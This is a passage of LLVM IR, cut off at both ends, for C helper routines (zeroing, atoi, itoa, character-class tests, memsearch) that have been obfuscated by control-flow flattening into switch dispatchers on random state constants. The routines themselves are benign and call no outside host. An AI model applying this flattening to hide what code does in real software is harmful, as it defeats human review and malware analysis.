  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 292853247, label %11
    i32 -1617550850, label %16
    i32 1554421348, label %22
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %6, align 4
  %13 = add nsw i32 %12, -1
  store i32 %13, i32* %6, align 4
  %14 = icmp ne i32 %12, 0
  %15 = select i1 %14, i32 -1617550850, i32 1554421348
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load i8*, i8** %8, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %8, align 8
  %19 = load i8, i8* %17, align 1
  %20 = load i8*, i8** %7, align 8
  %21 = getelementptr inbounds i8, i8* %20, i32 1
  store i8* %21, i8** %7, align 8
  store i8 %19, i8* %20, align 1
  store i32 292853247, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @util_zero(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load i8*, i8** %3, align 8
  store i8* %6, i8** %5, align 8
  %switchVar = alloca i32
  store i32 -1110572445, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1110572445, label %7
    i32 -1156443539, label %12
    i32 -2142983050, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i32, i32* %4, align 4
  %9 = add nsw i32 %8, -1
  store i32 %9, i32* %4, align 4
  %10 = icmp ne i32 %8, 0
  %11 = select i1 %10, i32 -1156443539, i32 -2142983050
  store i32 %11, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8*, i8** %5, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %5, align 8
  store i8 0, i8* %13, align 1
  store i32 -1110572445, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %12, %7, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_atoi(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i32 0, i32* %8, align 4
  %switchVar = alloca i32
  store i32 -1164396733, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1164396733, label %11
    i32 -728953210, label %16
    i32 1089197887, label %22
    i32 79115054, label %26
    i32 -1703778510, label %31
    i32 1709122324, label %35
    i32 -1417707021, label %40
    i32 968210616, label %41
    i32 -769378431, label %54
    i32 714836952, label %60
    i32 -32344514, label %63
    i32 -410954864, label %69
    i32 -774556640, label %77
    i32 -1332607347, label %78
    i32 -1138168179, label %79
    i32 -335926319, label %84
    i32 1244806730, label %85
    i32 1605806758, label %89
    i32 -229547541, label %94
    i32 -949565933, label %99
    i32 -416009939, label %104
    i32 1048716728, label %105
    i32 2147426024, label %114
    i32 -1893845013, label %115
    i32 -601777271, label %120
    i32 1470497575, label %124
    i32 1801073407, label %128
    i32 -885165133, label %132
    i32 872093916, label %135
    i32 -1106039894, label %136
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i8*, i8** %3, align 8
  %13 = getelementptr inbounds i8, i8* %12, i32 1
  store i8* %13, i8** %3, align 8
  %14 = load i8, i8* %12, align 1
  %15 = sext i8 %14 to i32
  store i32 %15, i32* %6, align 4
  store i32 -728953210, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load i32, i32* %6, align 4
  %18 = trunc i32 %17 to i8
  %19 = call i32 @util_isspace(i8 signext %18)
  %20 = icmp ne i32 %19, 0
  %21 = select i1 %20, i32 -1164396733, i32 1089197887
  store i32 %21, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %6, align 4
  %24 = icmp eq i32 %23, 45
  %25 = select i1 %24, i32 79115054, i32 -1703778510
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  store i32 1, i32* %8, align 4
  %27 = load i8*, i8** %3, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %3, align 8
  %29 = load i8, i8* %27, align 1
  %30 = sext i8 %29 to i32
  store i32 %30, i32* %6, align 4
  store i32 968210616, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i32, i32* %6, align 4
  %33 = icmp eq i32 %32, 43
  %34 = select i1 %33, i32 1709122324, i32 -1417707021
  store i32 %34, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8*, i8** %3, align 8
  %37 = getelementptr inbounds i8, i8* %36, i32 1
  store i8* %37, i8** %3, align 8
  %38 = load i8, i8* %36, align 1
  %39 = sext i8 %38 to i32
  store i32 %39, i32* %6, align 4
  store i32 -1417707021, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  store i32 968210616, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i32, i32* %8, align 4
  %43 = icmp ne i32 %42, 0
  %44 = select i1 %43, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %44, i64* %7, align 8
  %45 = load i64, i64* %7, align 8
  %46 = load i32, i32* %4, align 4
  %47 = sext i32 %46 to i64
  %48 = urem i64 %45, %47
  %49 = trunc i64 %48 to i32
  store i32 %49, i32* %10, align 4
  %50 = load i32, i32* %4, align 4
  %51 = sext i32 %50 to i64
  %52 = load i64, i64* %7, align 8
  %53 = udiv i64 %52, %51
  store i64 %53, i64* %7, align 8
  store i64 0, i64* %5, align 8
  store i32 0, i32* %9, align 4
  store i32 -769378431, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %6, align 4
  %56 = trunc i32 %55 to i8
  %57 = call i32 @util_isdigit(i8 signext %56)
  %58 = icmp ne i32 %57, 0
  %59 = select i1 %58, i32 714836952, i32 -32344514
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %6, align 4
  %62 = sub nsw i32 %61, 48
  store i32 %62, i32* %6, align 4
  store i32 -1138168179, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* %6, align 4
  %65 = trunc i32 %64 to i8
  %66 = call i32 @util_isalpha(i8 signext %65)
  %67 = icmp ne i32 %66, 0
  %68 = select i1 %67, i32 -410954864, i32 -774556640
  store i32 %68, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %6, align 4
  %71 = trunc i32 %70 to i8
  %72 = call i32 @util_isupper(i8 signext %71)
  %73 = icmp ne i32 %72, 0
  %74 = select i1 %73, i32 55, i32 87
  %75 = load i32, i32* %6, align 4
  %76 = sub nsw i32 %75, %74
  store i32 %76, i32* %6, align 4
  store i32 -1332607347, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  store i32 -601777271, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 -1138168179, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i32, i32* %6, align 4
  %81 = load i32, i32* %4, align 4
  %82 = icmp sge i32 %80, %81
  %83 = select i1 %82, i32 -335926319, i32 1244806730
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  store i32 -601777271, i32* %switchVar
  br label %loopEnd

; <label>:85:                                     ; preds = %loopEntry
  %86 = load i32, i32* %9, align 4
  %87 = icmp slt i32 %86, 0
  %88 = select i1 %87, i32 -416009939, i32 1605806758
  store i32 %88, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load i64, i64* %5, align 8
  %91 = load i64, i64* %7, align 8
  %92 = icmp ugt i64 %90, %91
  %93 = select i1 %92, i32 -416009939, i32 -229547541
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i64, i64* %5, align 8
  %96 = load i64, i64* %7, align 8
  %97 = icmp eq i64 %95, %96
  %98 = select i1 %97, i32 -949565933, i32 1048716728
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32, i32* %6, align 4
  %101 = load i32, i32* %10, align 4
  %102 = icmp sgt i32 %100, %101
  %103 = select i1 %102, i32 -416009939, i32 1048716728
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  store i32 -1, i32* %9, align 4
  store i32 2147426024, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %106 = load i32, i32* %4, align 4
  %107 = sext i32 %106 to i64
  %108 = load i64, i64* %5, align 8
  %109 = mul i64 %108, %107
  store i64 %109, i64* %5, align 8
  %110 = load i32, i32* %6, align 4
  %111 = sext i32 %110 to i64
  %112 = load i64, i64* %5, align 8
  %113 = add i64 %112, %111
  store i64 %113, i64* %5, align 8
  store i32 2147426024, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  store i32 -1893845013, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = load i8*, i8** %3, align 8
  %117 = getelementptr inbounds i8, i8* %116, i32 1
  store i8* %117, i8** %3, align 8
  %118 = load i8, i8* %116, align 1
  %119 = sext i8 %118 to i32
  store i32 %119, i32* %6, align 4
  store i32 -769378431, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %9, align 4
  %122 = icmp slt i32 %121, 0
  %123 = select i1 %122, i32 1470497575, i32 1801073407
  store i32 %123, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i32, i32* %8, align 4
  %126 = icmp ne i32 %125, 0
  %127 = select i1 %126, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %127, i64* %5, align 8
  store i32 -1106039894, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load i32, i32* %8, align 4
  %130 = icmp ne i32 %129, 0
  %131 = select i1 %130, i32 -885165133, i32 872093916
  store i32 %131, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i64, i64* %5, align 8
  %134 = sub i64 0, %133
  store i64 %134, i64* %5, align 8
  store i32 872093916, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  store i32 -1106039894, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load i64, i64* %5, align 8
  %138 = trunc i64 %137 to i32
  ret i32 %138

loopEnd:                                          ; preds = %135, %132, %128, %124, %120, %115, %114, %105, %104, %99, %94, %89, %85, %84, %79, %78, %77, %69, %63, %60, %54, %41, %40, %35, %31, %26, %22, %16, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isspace(i8 signext) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1802527664, i32* %switchVar
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1802527664, label %first
    i32 38939654, label %7
    i32 -327713121, label %12
    i32 -1063219791, label %17
    i32 1325813631, label %21
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp eq i32 %.reload, 32
  %6 = select i1 %5, i32 1325813631, i32 38939654
  store i32 %6, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i8, i8* %2, align 1
  %9 = sext i8 %8 to i32
  %10 = icmp eq i32 %9, 9
  %11 = select i1 %10, i32 1325813631, i32 -327713121
  store i32 %11, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8, i8* %2, align 1
  %14 = sext i8 %13 to i32
  %15 = icmp eq i32 %14, 10
  %16 = select i1 %15, i32 1325813631, i32 -1063219791
  store i32 %16, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i8, i8* %2, align 1
  %19 = sext i8 %18 to i32
  %20 = icmp eq i32 %19, 10
  store i32 1325813631, i32* %switchVar
  store i1 %20, i1* %.reg2mem2
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %22 = zext i1 %.reload3 to i32
  ret i32 %22

loopEnd:                                          ; preds = %17, %12, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isdigit(i8 signext) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 405698965, i32* %switchVar
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 405698965, label %first
    i32 -617320888, label %7
    i32 1259350044, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sge i32 %.reload, 48
  %6 = select i1 %5, i32 -617320888, i32 1259350044
  store i32 %6, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i8, i8* %2, align 1
  %9 = sext i8 %8 to i32
  %10 = icmp sle i32 %9, 57
  store i32 1259350044, i32* %switchVar
  store i1 %10, i1* %.reg2mem2
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %12 = zext i1 %.reload3 to i32
  ret i32 %12

loopEnd:                                          ; preds = %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isalpha(i8 signext) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 538222405, i32* %switchVar
  %.reg2mem2 = alloca i1
  %.reg2mem4 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 538222405, label %first
    i32 1084414685, label %7
    i32 1505067475, label %12
    i32 -945963335, label %17
    i32 -1030339197, label %21
    i32 -1567672462, label %22
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sge i32 %.reload, 65
  %6 = select i1 %5, i32 1084414685, i32 1505067475
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i8, i8* %2, align 1
  %9 = sext i8 %8 to i32
  %10 = icmp sle i32 %9, 90
  %11 = select i1 %10, i32 -1567672462, i32 1505067475
  store i32 %11, i32* %switchVar
  store i1 true, i1* %.reg2mem4
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8, i8* %2, align 1
  %14 = sext i8 %13 to i32
  %15 = icmp sge i32 %14, 97
  %16 = select i1 %15, i32 -945963335, i32 -1030339197
  store i32 %16, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i8, i8* %2, align 1
  %19 = sext i8 %18 to i32
  %20 = icmp sle i32 %19, 122
  store i32 -1030339197, i32* %switchVar
  store i1 %20, i1* %.reg2mem2
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  store i32 -1567672462, i32* %switchVar
  store i1 %.reload3, i1* %.reg2mem4
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %.reload5 = load i1, i1* %.reg2mem4
  %23 = zext i1 %.reload5 to i32
  ret i32 %23

loopEnd:                                          ; preds = %21, %17, %12, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isupper(i8 signext) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1963382105, i32* %switchVar
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1963382105, label %first
    i32 -1581484352, label %7
    i32 -2097275545, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sge i32 %.reload, 65
  %6 = select i1 %5, i32 -1581484352, i32 -2097275545
  store i32 %6, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i8, i8* %2, align 1
  %9 = sext i8 %8 to i32
  %10 = icmp sle i32 %9, 90
  store i32 -2097275545, i32* %switchVar
  store i1 %10, i1* %.reg2mem2
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %12 = zext i1 %.reload3 to i32
  ret i32 %12

loopEnd:                                          ; preds = %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i8* @util_itoa(i32, i32, i8*) #0 {
  %.reg2mem = alloca i8*
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca [34 x i8], align 16
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  %13 = load i8*, i8** %7, align 8
  store i8* %13, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 1896230483, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1896230483, label %first
    i32 769972640, label %16
    i32 1877081590, label %17
    i32 -1594607636, label %21
    i32 1860275417, label %26
    i32 -2018574774, label %30
    i32 587059613, label %33
    i32 -122602117, label %35
    i32 1681558222, label %36
    i32 -158632556, label %40
    i32 1622444630, label %47
    i32 1361342339, label %50
    i32 -217458779, label %53
    i32 -827190364, label %64
    i32 -935989622, label %68
    i32 1665918451, label %72
    i32 996653999, label %75
    i32 351907370, label %81
    i32 -484035170, label %86
    i32 1998001854, label %88
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %14 = icmp eq i8* %.reload, null
  %15 = select i1 %14, i32 769972640, i32 1877081590
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i8* null, i8** %4, align 8
  store i32 1998001854, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i32, i32* %5, align 4
  %19 = icmp ne i32 %18, 0
  %20 = select i1 %19, i32 -1594607636, i32 351907370
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  store i32 32, i32* %10, align 4
  %22 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 33
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %6, align 4
  %24 = icmp eq i32 %23, 10
  %25 = select i1 %24, i32 1860275417, i32 587059613
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32, i32* %5, align 4
  %28 = icmp slt i32 %27, 0
  %29 = select i1 %28, i32 -2018574774, i32 587059613
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %31 = load i32, i32* %5, align 4
  %32 = sub nsw i32 0, %31
  store i32 %32, i32* %12, align 4
  store i32 -122602117, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  %34 = load i32, i32* %5, align 4
  store i32 %34, i32* %12, align 4
  store i32 -122602117, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  store i32 1681558222, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %12, align 4
  %38 = icmp ne i32 %37, 0
  %39 = select i1 %38, i32 -158632556, i32 -827190364
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %12, align 4
  %42 = load i32, i32* %6, align 4
  %43 = urem i32 %41, %42
  store i32 %43, i32* %11, align 4
  %44 = load i32, i32* %11, align 4
  %45 = icmp slt i32 %44, 10
  %46 = select i1 %45, i32 1622444630, i32 1361342339
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* %11, align 4
  %49 = add nsw i32 %48, 48
  store i32 %49, i32* %11, align 4
  store i32 -217458779, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i32, i32* %11, align 4
  %52 = add nsw i32 %51, 55
  store i32 %52, i32* %11, align 4
  store i32 -217458779, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i32, i32* %11, align 4
  %55 = trunc i32 %54 to i8
  %56 = load i32, i32* %10, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %57
  store i8 %55, i8* %58, align 1
  %59 = load i32, i32* %6, align 4
  %60 = load i32, i32* %12, align 4
  %61 = udiv i32 %60, %59
  store i32 %61, i32* %12, align 4
  %62 = load i32, i32* %10, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %10, align 4
  store i32 1681558222, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i32, i32* %9, align 4
  %66 = icmp ne i32 %65, 0
  %67 = select i1 %66, i32 -935989622, i32 1665918451
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i32, i32* %10, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %70
  store i8 45, i8* %71, align 1
  store i32 996653999, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %10, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %10, align 4
  store i32 996653999, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i8*, i8** %7, align 8
  %77 = load i32, i32* %10, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %78
  %80 = call i32 @util_strcpy(i8* %76, i8* %79)
  store i32 -484035170, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i8*, i8** %7, align 8
  %83 = getelementptr inbounds i8, i8* %82, i64 0
  store i8 48, i8* %83, align 1
  %84 = load i8*, i8** %7, align 8
  %85 = getelementptr inbounds i8, i8* %84, i64 1
  store i8 0, i8* %85, align 1
  store i32 -484035170, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i8*, i8** %7, align 8
  store i8* %87, i8** %4, align 8
  store i32 1998001854, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i8*, i8** %4, align 8
  ret i8* %89

loopEnd:                                          ; preds = %86, %81, %75, %72, %68, %64, %53, %50, %47, %40, %36, %35, %33, %30, %26, %21, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  store i32 %12, i32* %.reg2mem
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 1811107855, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1811107855, label %first
    i32 -233811275, label %16
    i32 -1950584151, label %17
    i32 -240027860, label %18
    i32 -114901945, label %23
    i32 1049610672, label %38
    i32 1951083360, label %44
    i32 478332898, label %47
    i32 174511239, label %48
    i32 -1937946273, label %49
    i32 948513119, label %50
    i32 961399306, label %53
    i32 -436721368, label %54
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %14 = icmp sgt i32 %.reload, %.reload3
  %15 = select i1 %14, i32 -233811275, i32 -1950584151
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 -1, i32* %5, align 4
  store i32 -436721368, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* %10, align 4
  store i32 -240027860, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %10, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp slt i32 %19, %20
  %22 = select i1 %21, i32 -114901945, i32 961399306
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i8*, i8** %6, align 8
  %25 = load i32, i32* %10, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8, i8* %24, i64 %26
  %28 = load i8, i8* %27, align 1
  %29 = sext i8 %28 to i32
  %30 = load i8*, i8** %8, align 8
  %31 = load i32, i32* %11, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %29, %35
  %37 = select i1 %36, i32 1049610672, i32 174511239
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %11, align 4
  %41 = load i32, i32* %9, align 4
  %42 = icmp eq i32 %40, %41
  %43 = select i1 %42, i32 1951083360, i32 478332898
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %10, align 4
  %46 = add nsw i32 %45, 1
  store i32 %46, i32* %5, align 4
  store i32 -436721368, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 -1937946273, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
